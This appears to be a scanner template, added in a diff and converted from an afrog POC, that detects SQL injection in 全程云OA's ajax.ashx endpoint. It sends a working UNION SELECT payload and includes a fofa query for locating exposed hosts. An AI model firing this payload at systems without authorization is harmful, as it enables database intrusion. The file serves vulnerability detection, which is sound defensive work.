@@ -1,0 +1,32 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: dll=DispartSell_Core.dll&class=DispartSell_Core.BaseData.DrpDataManager&method=GetProductById&id=1 UNION ALL SELECT 1,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 -- A
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"PK_ID":'
+          - '"sCode":'
+          - sql server
+        case-insensitive: true
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/OA/common/mod/ajax.ashx'
+id: eqccd-oa-mod-ajax-sqli
+info:
+  author: zan8in
+  description: |-
+    全程云OA中存在SQL注入漏洞
+    fofa: "全程云OA" || "images/yipeoplehover.png"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 全程云OA SQL注入漏洞
+  severity: high
+  tags: eqccd,sqli,argus-import
